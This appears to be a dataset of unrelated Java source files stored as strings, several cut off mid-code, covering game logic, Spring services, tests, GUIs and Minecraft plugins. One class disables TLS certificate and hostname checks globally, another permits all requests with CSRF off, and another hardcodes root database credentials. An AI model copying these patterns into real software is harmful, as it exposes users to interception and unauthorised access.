    "import Personage.Personage;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class World_of_Warcraft {\n    private final List<Personage> personages = new ArrayList<>();\n\n    public String winnerDuel(Personage p1, Personage p2) {\n        int dangerCapacityP1 = p1.getEnergyLevel() * p1.getOffensiveCapacity() - p1.getDefensiveCapacity();\n        int dangerCapacityP2 = p2.getEnergyLevel() * p2.getOffensiveCapacity() - p2.getDefensiveCapacity();\n\n        return dangerCapacityP1 > dangerCapacityP2 ? p1.getId() : p2.getId();\n    }\n    public int PersonageLessVictory(int[][] statistics){\n        int lesserVictoriesIndex = 0;\n        int victoriesValue = statistics[0][0];\n\n        for(int i = 0; i < statistics.length; i++){\n            if(statistics[i][0] < victoriesValue){\n                lesserVictoriesIndex = i;\n                victoriesValue = statistics[i][0];\n            }\n        }\n\n        return lesserVictoriesIndex;\n    }\n\n    public String moreHordesAlliance(){\n        int quantityHordes = (int) personages.stream().filter(p -> p.getBreed() == 'T' || p.getBreed() == 'O' || p.getBreed() == 'M').count();\n        return personages.size() - quantityHordes < quantityHordes ? \"Hordes\" : \"Alliance\";\n    }\n\n    public int quantityPersonagesByBreed(String breed){\n        char[] auxBreed = new char[1];\n\n        switch (breed){\n            case \"Humano\" -> auxBreed[0] = 'H';\n            case \"Elfos\" -> auxBreed[0] = 'F';\n            case \"Enanos\" -> auxBreed[0] = 'E';\n            case \"Trolls\" -> auxBreed[0] = 'T';\n            case \"Orcos\" -> auxBreed[0] = 'O';\n            case \"Muertos\" -> auxBreed[0] = 'M';\n        }\n\n        return (int) personages.stream().filter(personage -> personage.getBreed() == auxBreed[0]).count();\n    }\n\n    public List<Personage> getPersonages() {\n        return personages;\n    }\n}\n",
    "package US_503;\n\n\nimport US_501.Register_Elements;\nimport US_502.Login_Elements;\nimport Utility.BaseDriver;\nimport org.testng.annotations.DataProvider;\nimport org.testng.annotations.Test;\n\npublic class PositiveNegativeLogin extends BaseDriver {\n    @Test(dataProvider = \"NegativEmailAdress\", groups = {\"Smoke Test\", \"Login Test\"})\n    public void PositiveNegativeLoginTest(String email, String password) {\n        Register_Elements re = new Register_Elements();\n        Login_Elements le = new Login_Elements();\n\n        le.login.click();\n\n        if (email.equals(\"hasan@gmail.com\") ||\n                email.equals(\"ali@gmail.com\") ||\n                email.equals(\"mehmet@gmail.com\") ||\n                email.equals(\"\u015ferafettin@gmail.com\") ||\n                email.equals(\"naciye@gmail.com\") ||\n                email.equals(\"saziye@gmail.com\") && password.equals(\"pssst212\"))\n        {\n            re.email.sendKeys(email);\n            re.password.sendKeys(password);\n            le.loginButton.click();\n        }\n    }\n\n    @DataProvider\n    public Object[][] NegativEmailAdress() {\n        Object[][] emailList =\n                {\n                {\"hasan@gmail.com\", \"psst212\"},\n                {\"mehmet@gmail.com\", \"pssst212\"},\n                {\"ali@gmail.com\", \"pssst212\"},\n                {\"\u015ferafettin@gmail.com\", \"pssst212\"},\n                {\"naciye@gmail.com\", \"pssst212\"},\n                {\"saziye@gmail.com\", \"pssst212\"}\n                };\n        return emailList;\n    }\n}\n",
    "package ma.xproce.video.service;\n\nimport ma.xproce.video.dao.entity.Creator;\nimport ma.xproce.video.dao.entity.Video;\nimport ma.xproce.video.dao.repository.VideoRepository;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\nimport java.util.List;\nimport java.util.Optional;\n\n@Service\npublic class VideoService implements VideoManager {\n@Autowired\n    VideoRepository videoRepository;\n    @Override\n    public Video addVideo(Video video) {\n        if (video.getUrl().isEmpty()){\n            System.out.println(\"no url was given\");\n            return null;\n        }\n        return videoRepository.save(video);\n    }\n\n    @Override\n    public Video updateVideo(Video video) {\n        Optional<Video> existingVideo = videoRepository.findById(video.getId());\n\n        if(existingVideo.isEmpty()) {\n            System.out.println(\"There ain't no bloody Video with this bleedin' id: \" + video.getId());\n            return null;\n        }\n\n        Video oldVideo = existingVideo.get();\n        oldVideo.setDatePublication(video.getDatePublication());\n        oldVideo.setName(video.getName());\n        oldVideo.setCreator(video.getCreator());\n        oldVideo.setDescription(video.getDescription());\n        oldVideo.setUrl(video.getUrl());\n\n        return videoRepository.save(oldVideo);\n\n    }\n\n    @Override\n    public boolean deleteVideo(Video video) {\n        Optional<Video> existingVideo = videoRepository.findById(video.getId());\n        if (existingVideo.isEmpty()) {\n            System.out.println(\"No fookin' video found with that pissin' ID: \" + video.getId());\n            return false;\n        }\n\n        videoRepository.delete(existingVideo.get());\n\n        return !videoRepository.existsById(video.getId());\n    }\n\n\n    @Override\n    public List<Video> getAllVideos() {\n        return videoRepository.findAll();\n    }\n\n    @Override\n    public Video getVideoById(long id) {\n        if(videoRepository.getById(id) == null) {\n            System.out.println(\"no creator was found matching that id\" + id);\n            return null;\n        }\n        return videoRepository.getById(id);\n    }\n    @Override\n    public Optional<List<Video>> getVideoByCreator(Creator creator) {\n            return videoRepository.findVideosByCreator(creator);\n        }\n    }\n\n\n",
    "package com.tema1;\n\nimport net.objecthunter.exp4j.Expression;\nimport net.objecthunter.exp4j.ExpressionBuilder;\nimport java.util.ArrayDeque;\nimport java.util.Deque;\n\npublic class MathExpressionEvaluatorService {\n    public static boolean validateExpression(String expression) {\n        return expression.matches(\"^[0-9+\\\\-*/.^sqrt()]*$\");\n    }\n\n    public static double evaluateExpressionWithExp4j(String expression) {\n        try {\n            Expression builtExpression = new ExpressionBuilder(expression).build();\n\n            return builtExpression.evaluate();\n        } catch (Exception exception) {\n            System.err.println(STR.\"Error encountered while evaluating expression with exp4j- \\{exception.getMessage()}\");\n\n            return Double.NaN;\n        }\n    }\n\n    public static double evaluateExpressionWithShuntingYardAlgorithm(String expression) {\n        // folosim algoritmul shunting yard https://en.wikipedia.org/wiki/Shunting_yard_algorithm\n\n        try {\n            // convert to postfix notation\n            Deque<String> postfix = infixToPostfix(expression);\n            // evaluate postfix expression\n            return evaluatePostfix(postfix);\n        } catch (Exception exception) {\n            System.err.println(STR.\"Error encountered while evaluating expression with shunting yard alg - \\{exception.getMessage()}\");\n\n            return Double.NaN;\n        }\n    }\n\n    private static Deque<String> infixToPostfix(String expression) {\n        Deque<String> operationsStack = new ArrayDeque<>();\n        Deque<String> outputQueue = new ArrayDeque<>();\n\n        // notam cu s/p radacina patrata si ridicarea la putere\n        expression = expression.replaceAll(\"sqrt\\\\(([^)]+)\\\\)\", \"s$1\");\n        expression = expression.replaceAll(\"([\\\\d.]+)\\\\^(\\\\d+)\", \"p$1,$2\");\n\n        for (int i = 0; i < expression.length(); i++) {\n            char c = expression.charAt(i);\n\n            if (Character.isDigit(c) || c == 's' || c == 'p') {\n                // daca e un numar sau notatia pt putere/radacina patrata, il bagam in output queue\n                StringBuilder number = new StringBuilder(c == 's' ? \"s\" : (c == 'p' ? \"p\" : String.valueOf(c)));\n                while (i + 1 < expression.length() && (Character.isDigit(expression.charAt(i + 1)) || expression.charAt(i + 1) == '.' || expression.charAt(i + 1) == ',')) {\n                    number.append(expression.charAt(++i));\n                }\n\n                outputQueue.add(number.toString());\n            } else if (c == '(') {\n                // daca e o paranteza deschisa, o bagam in stackul de operatii\n                operationsStack.push(String.valueOf(c));\n            } else if (c == ')') {\n                // daca este o paranteza inchisa, cat timp cat nu avem o paranteza deschisa in top of stack\n                // dam pop la operatorii din stack in output queue\n                while (!operationsStack.isEmpty() && !operationsStack.peek().equals(\"(\")) {\n                    outputQueue.add(operationsStack.pop());\n                }\n                // altfel, ii dam pop din stack\n                operationsStack.pop();\n            } else if (isOperator(c)) {\n                // daca este operator, cat timp avem un operator at the top of stack cu precedenta mai mare\n                // dam pop la operatorii din stack in output queue\n                while (!operationsStack.isEmpty() && precedence(operationsStack.peek().charAt(0)) >= precedence(c)) {\n                    outputQueue.add(operationsStack.pop());\n                }\n                // altfel, ii bagam in stackul de operatii\n                operationsStack.push(String.valueOf(c));\n            }\n        }\n\n        // cat timp mai sunt operatori in stack, ii bagam in output queue\n        while (!operationsStack.isEmpty()) {\n            outputQueue.add(operationsStack.pop());\n        }\n\n        return outputQueue;\n    }\n\n    private static boolean isOperator(char c) {\n        return c == '+' || c == '-' || c == '*' || c == '/';\n    }\n\n    private static int precedence(char operator) {\n        return switch (operator) {\n            case '+', '-' -> 1;\n            case '*', '/' -> 2;\n            default -> -1;\n        };\n    }\n\n    private static double evaluatePostfix(Deque<String> postfix) {\n        Deque<Double> stack = new ArrayDeque<>();\n\n        for (String token : postfix) {\n            if (token.matches(\"[+\\\\-*/]\")) {\n                double secondOperand = stack.pop();\n                double firstOperand = stack.pop();\n\n                double result = switch (token) {\n                    case \"+\" -> firstOperand + secondOperand;\n                    case \"-\" -> firstOperand - secondOperand;\n                    case \"*\" -> firstOperand * secondOperand;\n                    case \"/\" -> {\n                        if (secondOperand == 0) {\n                            throw new ArithmeticException(\"Division by zero\");\n                        }\n\n                        yield firstOperand / secondOperand;\n            ",
    "package com.tofa.islobby.listener;\n\nimport com.tofa.islobby.IsLobby;\nimport com.tofa.islobby.config.SpawnConfiguration;\nimport org.bukkit.Location;\nimport org.bukkit.entity.Player;\nimport org.bukkit.event.EventHandler;\nimport org.bukkit.event.Listener;\nimport org.bukkit.event.player.PlayerJoinEvent;\n\npublic class PlayerJoinListener implements Listener {\n\n    private final IsLobby plugin;\n    public PlayerJoinListener(IsLobby plugin) {\n        this.plugin = plugin;\n\n    }\n    @EventHandler\n    public void onPlayerJoin(PlayerJoinEvent e) {\n        SpawnConfiguration spawnConfiguration = plugin.getConfigLoader().getSpawnConfiguration();\n        Player p = e.getPlayer();\n        Location spawnLocation = spawnConfiguration.getLocationConfiguration().asLocation();\n\n        if(!p.hasPlayedBefore() && spawnConfiguration.isSpawnOnFirstConnect()) {\n            p.teleport(spawnLocation);\n        }\n\n        if(spawnConfiguration.isAlwaysTpToSpawnOnJoin()) {\n            p.teleport(spawnLocation);\n        }\n    }\n}\n",
    "package dev.easylogbe.config;\n\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;\nimport org.springframework.security.config.annotation.web.configurers.HeadersConfigurer;\nimport org.springframework.security.config.http.SessionCreationPolicy;\nimport org.springframework.security.web.SecurityFilterChain;\n\n@Configuration\n@EnableWebSecurity\n@RequiredArgsConstructor\npublic class SecurityConfig {\n\n    private static final String[] AUTH_WHITELIST = {\n    };\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n\n        return http\n                .authorizeHttpRequests(authorize -> authorize\n                        .anyRequest().permitAll()\n                )\n                .headers(header -> header\n                        .frameOptions(HeadersConfigurer.FrameOptionsConfig::sameOrigin)\n                )\n                .formLogin(AbstractHttpConfigurer::disable)\n                .httpBasic(AbstractHttpConfigurer::disable)\n                .csrf(AbstractHttpConfigurer::disable)\n                .sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))\n                .build();\n    }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\n */\npackage com.dicsstartup.devformfx;\n\nimport javafx.scene.layout.ColumnConstraints;\nimport javafx.scene.layout.GridPane;\nimport javafx.scene.layout.Priority;\nimport javafx.scene.layout.RowConstraints;\n\n/**\n *\n * @author Didier\n */\npublic class DevGrid extends GridPane {\n\n    public DevGrid() {\n        super();\n    }\n\n    public void addConstrainCol(double porcentaje) {\n        ColumnConstraints column = new ColumnConstraints();\n        column.setPercentWidth(porcentaje);\n        column.setHgrow(Priority.ALWAYS);\n        getColumnConstraints().add(column);\n    }\n\n    public void addConstrainCol() {\n        ColumnConstraints column = new ColumnConstraints();\n        column.setHgrow(Priority.ALWAYS);\n        getColumnConstraints().add(column);\n    }\n\n    public void addColsWithWidth(double... width) {\n        for (double w : width) {\n            addConstrainCol(w);\n        }\n    }\n\n    public void addCols(int cantidad) {\n        for (int i = 0; i > cantidad; i++) {\n            addConstrainCol();\n        }\n    }\n\n    public void addConstrainRow(double heigtht) {\n        RowConstraints row = this.row();\n        row.setPrefHeight(heigtht);\n        getRowConstraints().add(row);\n    }\n\n    public void addConstrainRow() {\n        getRowConstraints().add(this.row());\n    }\n\n    private RowConstraints row() {\n        return new RowConstraints();\n    }\n\n    public void addRowsWithHeigtht(double... heigtht) {\n        for (double h : heigtht) {\n            addConstrainRow(h);\n        }\n    }\n\n    public void addRows(int cantidad) {\n        for (int i = 0; i > cantidad; i++) {\n            addConstrainRow();\n        }\n    }\n\n}\n",
    "package repository;\n\nimport model.Pessoa;\nimport utility.TipoCargo;\nimport utility.TipoPlano;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class RepositoryPessoa {\n    ArquivoUtil arquivo;\n    List<Pessoa> pessoas;\n\n    public RepositoryPessoa(ArquivoPaths path) {\n        arquivo = new ArquivoUtil(path);\n        pessoas = carregarPessoas();\n    }\n\n    public List<Pessoa> carregarPessoas() {\n        List<String> pessoasStr = arquivo.lerArquivo();\n        List<Pessoa> pessoas = new ArrayList<>();\n        pessoasStr.stream().skip(1).map((this::pessoaParser)).forEach(pessoas::add);\n        return pessoas;\n    }\n\n    public void salvarPessoas(List<Pessoa> pessoas) {\n        pessoas.forEach(this::salvarPessoa);\n    }\n\n    public void salvarPessoa(Pessoa pessoa) {\n        String pessoaStr = pessoa.getId() + \";\"\n                + pessoa.getUsername() + \";\"\n                + pessoa.getNome() + \";\"\n                + pessoa.getCpf() + \";\"\n                + pessoa.getCargo().toString() + \";\"\n                + pessoa.getPlano().toString();\n\n        arquivo.escreverArquivo(pessoaStr);\n    }\n\n    public Pessoa pessoaParser(String linha) {\n        String[] valores = linha.split(\";\");\n\n        return new Pessoa.Builder()\n                .id(valores[0])\n                .username(valores[1])\n                .nome(valores[2])\n                .cpf(valores[3])\n                .cargo(TipoCargo.valueOf(valores[4]))\n                .plano(TipoPlano.valueOf(valores[5]))\n                .build();\n    }\n\n    public Pessoa buscarPessoa(String id) {\n        return pessoas.stream()\n                .filter(pessoa -> pessoa.getId().toString().equals(id))\n                .findFirst().orElse(null);\n    }\n\n    public Pessoa buscarPessoaPorUsername(String username) {\n        return pessoas.stream()\n                .filter(pessoa -> pessoa.getUsername().equals(username))\n                .findFirst().orElse(null);\n    }\n}",
    "package top.dj.model.businesslog.domain.entity;\n\nimport lombok.Data;\n\nimport javax.persistence.Id;\nimport javax.persistence.Table;\nimport java.io.Serial;\nimport java.io.Serializable;\nimport java.util.Date;\n\n\n@Data\n@Table(name = \"business_log\")\npublic class BusinessLog implements Serializable {\n\n    @Serial\n    private static final long serialVersionUID = 7352050262923756969L;\n\n    /**\n     * \u64cd\u4f5c\u65e5\u5fd7\u4e3b\u952eid\n     */\n    @Id\n    private Long id;\n\n    /**\n     * \u8868\u540d\n     */\n    private String tableName;\n\n    /**\n     * \u5355\u4f4did\n     */\n    private Long companyId;\n\n    /**\n     * \u5355\u4f4d\u540d\u79f0\n     */\n    private String companyName;\n\n    /**\n     * \u65e5\u5fd7\u6807\u9898\n     */\n    private String logTitle;\n\n    /**\n     * \u53d1\u751f\u53d8\u66f4\u7684\u5b57\u6bb5\u540d\n     */\n    private String changeField;\n\n    /**\n     * \u65e5\u5fd7\u7c7b\u578b\uff081UPDATE\u30012DELETE\u30013INSERT\uff09\n     */\n    private Integer logType;\n\n    /**\n     * \u64cd\u4f5c\u7c7b\u578b\uff08\u5982\uff1a\u8425\u4e1a\u72b6\u6001\u53d8\u66f4\u3001\u884c\u653f\u533a\u5212\u53d8\u66f4... \u5177\u4f53\u8bf7\u53c2\u8003\uff1aRecordOperationTypeEnum\uff09\n     */\n    private Byte busiType;\n\n    /**\n     * \u8bf7\u6c42\u7684\u5730\u5740\n     */\n    private String requestUrl;\n\n    /**\n     * \u53d8\u66f4\u524d\u4fe1\u606f\n     */\n    private String beforeInfo;\n\n    /**\n     * \u53d8\u66f4\u540e\u4fe1\u606f\n     */\n    private String afterInfo;\n\n    /**\n     * \u8bf7\u6c42IP\n     */\n    private String ip;\n\n    /**\n     * \u8bf7\u6c42\u5904\u7406\u65f6\u957f\uff08\u6beb\u79d2\uff09\n     */\n    private Long handleTime;\n\n    /**\n     * \u64cd\u4f5c\u65f6\u95f4\n     */\n    private Date createDate;\n\n    /**\n     * \u64cd\u4f5c\u4ebaID\n     */\n    private Long createBy;\n\n    /**\n     * \u65f6\u95f4\u6233\n     */\n    private Long timestamp;\n}\n",
    "\nimport javax.swing.JOptionPane;\n\n/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\n\n/**\n *\n * @author Ferrando Carlos\n */\npublic class Conversor extends javax.swing.JFrame {\n\n    /**\n     * Creates new form Conversor\n     */\n    public Conversor() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form. WARNING: Do NOT modify this code. The content of this method is always regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        seleccionTemp = new javax.swing.ButtonGroup();\n        jPanel1 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jPanel2 = new javax.swing.JPanel();\n        jrbtnCelcius = new javax.swing.JRadioButton();\n        jLabel3 = new javax.swing.JLabel();\n        jLabel6 = new javax.swing.JLabel();\n        jLabel7 = new javax.swing.JLabel();\n        jLabel8 = new javax.swing.JLabel();\n        jLabel9 = new javax.swing.JLabel();\n        jrbtnFahrenheit = new javax.swing.JRadioButton();\n        jLabel10 = new javax.swing.JLabel();\n        jtxtTemperatura = new javax.swing.JTextField();\n        jLabel2 = new javax.swing.JLabel();\n        jbtnConvertir = new javax.swing.JButton();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        setTitle(\"Conversor de Temperatura\");\n        setPreferredSize(new java.awt.Dimension(400, 400));\n        setSize(new java.awt.Dimension(400, 400));\n        getContentPane().setLayout(new org.netbeans.lib.awtextra.AbsoluteLayout());\n\n        jPanel1.setBackground(new java.awt.Color(140, 100, 31));\n        jPanel1.setToolTipText(\"\");\n\n        jLabel1.setFont(new java.awt.Font(\"Monospaced\", 0, 36)); // NOI18N\n        jLabel1.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel1.setText(\"CONVERSOR DE  \");\n\n        jPanel2.setBackground(new java.awt.Color(140, 100, 31));\n\n        seleccionTemp.add(jrbtnCelcius);\n        jrbtnCelcius.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jrbtnCelciusActionPerformed(evt);\n            }\n        });\n\n        jLabel3.setFont(new java.awt.Font(\"Monospaced\", 0, 14)); // NOI18N\n        jLabel3.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel3.setText(\"Convertir de:\");\n\n        jLabel6.setFont(new java.awt.Font(\"Roboto Black\", 0, 24)); // NOI18N\n        jLabel6.setForeground(new java.awt.Color(235, 161, 35));\n        jLabel6.setText(\"\u00b0C\");\n\n        jLabel7.setFont(new java.awt.Font(\"Roboto Black\", 0, 24)); // NOI18N\n        jLabel7.setForeground(new java.awt.Color(235, 161, 35));\n        jLabel7.setText(\"\u00b0F\");\n\n        jLabel8.setFont(new java.awt.Font(\"Monospaced\", 0, 14)); // NOI18N\n        jLabel8.setForeground(new java.awt.Color(255, 255, 255));\n        jLabel8.setText(\"Convertir de:\");\n\n        jLabel9.setFont(new java.awt.Font(\"Roboto Black\", 0, 24)); // NOI18N\n        jLabel9.setForeground(new java.awt.Color(235, 161, 35));\n        jLabel9.setText(\"\u00b0F\");\n\n        seleccionTemp.add(jrbtnFahrenheit);\n        jrbtnFahrenheit.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jrbtnFahrenheitActionPerformed(evt);\n            }\n        });\n\n        jLabel10.setFont(new java.awt.Font(\"Roboto Black\", 0, 24)); // NOI18N\n        jLabel10.setForeground(new java.awt.Color(235, 161, 35));\n        jLabel10.setText(\"\u00b0C\");\n\n        jtxtTemperatura.setBackground(new java.awt.Color(255, 255, 255));\n        jtxtTemperatura.setFont(new java.awt.Font(\"Monospaced\", 0, 18)); // NOI18N\n        jtxtTemperatura.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(235, 161, 35), 2, true));\n        jtxtTemperatura.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtTemperaturaActionPerformed(evt);\n            }\n        });\n\n        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);\n        jPanel2.setLayout(jPanel2Layout);\n        jPanel2Layout.setHorizontalGroup(\n            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel2Layout.createSequentialGroup()\n                .addContainerGap()\n                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(jPanel2Layout.createSequentialGroup()\n                        .addComponent(jLabel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                        .a",
    "package com.ras.demo.crawlFunc;\n\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport java.security.cert.X509Certificate;\n\npublic class SSLContextCreator {\n\n    public static SSLContext createSslContext() throws Exception {\n        TrustManager[] trustAllCerts = new TrustManager[]{\n                new X509TrustManager() {\n                    public X509Certificate[] getAcceptedIssuers() {\n                        return null;\n                    }\n\n                    public void checkClientTrusted(X509Certificate[] certs, String authType) {\n                    }\n\n                    public void checkServerTrusted(X509Certificate[] certs, String authType) {\n                    }\n                }\n        };\n\n        // SSL \ucee8\ud14d\uc2a4\ud2b8 \ucd08\uae30\ud654\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        sslContext.init(null, trustAllCerts, new java.security.SecureRandom());\n\n        // \ubaa8\ub4e0 \ud638\uc2a4\ud2b8 \uc774\ub984 \uac80\uc99d \ube44\ud65c\uc131\ud654 (\uc804\uc5ed \uc124\uc815)\n        HostnameVerifier allHostsValid = (hostname, session) -> true;\n        HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);\n\n        return sslContext;\n    }\n}\n\n",
    "package inventory;\r\n\r\nimport item.Item;\r\nimport item.ItemShelf;\r\n\r\npublic class Inventory {\r\n    private ItemShelf[] inventory;\r\n\r\n    public Inventory(int n) {\r\n        inventory = new ItemShelf[n];\r\n        initialEmptyInventory();\r\n    }\r\n\r\n    public ItemShelf[] getInventory() {\r\n        return this.inventory;\r\n    }\r\n\r\n    public void setInventory(ItemShelf[] inventory) {\r\n        this.inventory = inventory;\r\n    }\r\n\r\n    public void initialEmptyInventory() {\r\n        int startCode = 101;\r\n        for(int i=0;i<inventory.length;i++) {\r\n            ItemShelf itemShelf = new ItemShelf();\r\n            itemShelf.setItemCode(startCode);\r\n            itemShelf.setSoldOut(true);\r\n            inventory[i] = itemShelf;\r\n            startCode++;\r\n\r\n        }\r\n    }\r\n\r\n    public void addItem(Item item, int itemCode) { \r\n        for(ItemShelf shelf: inventory) {\r\n            if (shelf.getItemCode() == itemCode) {\r\n                if (shelf.isSoldOut() == true) {\r\n                    shelf.setItem(item);\r\n                    shelf.setSoldOut(false);\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    public Item getItem(int itemCode) {\r\n        for(ItemShelf shelf: inventory) {\r\n            if (shelf.getItemCode() == itemCode) {\r\n                if (shelf.isSoldOut()) {\r\n                    System.out.println(\"Item is already soldOut\");\r\n                    return new Item();\r\n                } else {\r\n                    return shelf.getItem();\r\n                }\r\n            }\r\n        }\r\n\r\n        System.out.println(\"Invalid item Code\");\r\n        return new Item();\r\n    }\r\n\r\n    public void updateSoldOutItem(int itemCodeNumber) {\r\n        for(ItemShelf shelf: inventory) {\r\n            if (shelf.getItemCode() == itemCodeNumber) {\r\n                shelf.setSoldOut(true);\r\n            }\r\n        }\r\n    }\r\n}\r\n",
    "package sql;\r\n\r\nimport java.sql.*;\r\n\r\n/**\r\n * @author XJC\r\n * @version JDK 8\r\n * @No 202210244314\r\n * @className SqlCreate\r\n * @date 2024/4/1 18:35\r\n */\r\npublic class SqlCreate {\r\n    Connection con; // Connection\u5bf9\u8c61\r\n    Statement st;//Statement\u5bf9\u8c61\r\n    String sqlExecute;//sql\u6267\u884c\u8bed\u53e5\r\n    private static String user;//\u7528\u6237\u540d\r\n    private static String password;//\u5bc6\u7801\r\n    public static final String dbName = \"LibSystem\";\r\n\r\n    public static void main(String[] args) {\r\n        new SqlCreate().DBCreate();\r\n    }\r\n\r\n    //\u521b\u5efa\u6570\u636e\u5e93\r\n    private Connection DBCreate() {\r\n        user = \"root\";//\u6570\u636e\u5e93\u767b\u5f55\u540d\r\n        password = \"123456\";//\u5bc6\u7801\r\n        try { // \u52a0\u8f7d\u6570\u636e\u5e93\u9a71\u52a8\u7c7b\r\n            Class.forName(\"com.mysql.cj.jdbc.Driver\");\r\n            // \u901a\u8fc7\u8bbf\u95ee\u6570\u636e\u5e93\u7684URL\u83b7\u53d6\u6570\u636e\u5e93\u8fde\u63a5\u5bf9\u8c61\r\n            con = DriverManager.getConnection\r\n                    (\"jdbc:mysql://localhost:3306\", user, password);\r\n            //\u6570\u636e\u5e93\u8fde\u63a5\u6210\u529f\r\n            st = con.createStatement();\r\n            //\u521b\u5efa\u6570\u636e\u5e93(\u5982\u679c\u4e0d\u5b58\u5728)\r\n            sqlExecute = \"CREATE DATABASE IF NOT EXISTS \" + dbName;\r\n            st.executeUpdate(sqlExecute);\r\n            //\u5173\u95ed\r\n            st.close();\r\n            con.close();\r\n        } catch (ClassNotFoundException | SQLException e) {\r\n            e.printStackTrace();\r\n        }\r\n        return con;\r\n    }\r\n}\r\n",
    "package com.springbootkvstore.lol;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\n\nimport java.util.Collection;\n\n@SpringBootApplication\n@RestController\npublic class SpringBootInMemory {\n\n    public static void main(String[] args) {\n        SpringApplication.run(SpringBootInMemory.class, args);\n    }\n\n    @Autowired\n    private KVStore<String, String> kvStore;\n\n    @GetMapping(\"/set\")\n    public ResponseEntity<String> set(@RequestParam String key, @RequestParam String val) {\n        if (StringUtils.isAnyNullOrBlank(key, val)) {\n            return ResponseEntity.badRequest().build();\n        }\n\n        if (kvStore.add(key, val)) {\n            return new ResponseEntity<>(\n                    \"Success\",\n                    HttpStatus.OK);\n        } else {\n            return new ResponseEntity<>(\"Cache is full\", HttpStatus.FAILED_DEPENDENCY);\n        }\n\n    }\n\n    @GetMapping(\"/get\")\n    public ResponseEntity<String> get(@RequestParam String key) {\n        if (key == null) {\n            return ResponseEntity.badRequest().build();\n        }\n\n        return new ResponseEntity<>(\n                kvStore.get(key),\n                HttpStatus.OK);\n    }\n\n    @GetMapping(\"/get-all\")\n    public ResponseEntity<String> getAll() {\n        Collection<String> all = kvStore.all();\n        return new ResponseEntity<>(\n                String.join(\", \", all),\n                HttpStatus.OK);\n    }\n\n\n}",
    "package net.pandadev.vitelist;\n\nimport com.google.inject.Inject;\nimport com.velocitypowered.api.command.CommandManager;\nimport com.velocitypowered.api.event.Subscribe;\nimport com.velocitypowered.api.event.connection.PostLoginEvent;\nimport com.velocitypowered.api.event.proxy.ProxyInitializeEvent;\nimport com.velocitypowered.api.plugin.Plugin;\nimport com.velocitypowered.api.plugin.annotation.DataDirectory;\nimport com.velocitypowered.api.proxy.Player;\nimport com.velocitypowered.api.proxy.ProxyServer;\nimport net.kyori.adventure.text.Component;\nimport org.slf4j.Logger;\nimport org.spongepowered.configurate.ConfigurateException;\nimport org.spongepowered.configurate.yaml.YamlConfigurationLoader;\n\nimport java.nio.file.Path;\nimport java.util.List;\n\n@Plugin(\n        id = \"vitelist\",\n        name = \"Main\",\n        version = \"1.0\",\n        description = \"A simple but useful whitelist plugin for Velocity\",\n        url = \"https://pandadev.net\",\n        authors = {\"PandaDEV\"}\n)\npublic class Main {\n\n    public static String prefix = \"\u00a7d\u00a7lVitelist \u00a78\u00bb \";\n    @Inject\n    private Logger logger;\n    @Inject\n    private ProxyServer server;\n    @Inject\n    @DataDirectory\n    private Path dataDirectory;\n    private YamlConfigurationLoader loader;\n    private boolean whitelistEnabled = true;\n\n    @Subscribe\n    public void onProxyInitialization(ProxyInitializeEvent event) {\n        loader = YamlConfigurationLoader.builder().path(dataDirectory.resolve(\"config.yml\")).build();\n        try {\n            var root = loader.load();\n            if (!root.node(\"whitelisted-uuids\").virtual()) {\n                whitelistEnabled = root.node(\"whitelist-enabled\").getBoolean(true);\n            } else {\n                root.node(\"whitelisted-uuids\").set(List.of());\n                root.node(\"whitelist-enabled\").set(true);\n                loader.save(root);\n            }\n        } catch (ConfigurateException e) {\n            logger.error(\"Failed to load/create config file\", e);\n        }\n\n        CommandManager commandManager = server.getCommandManager();\n        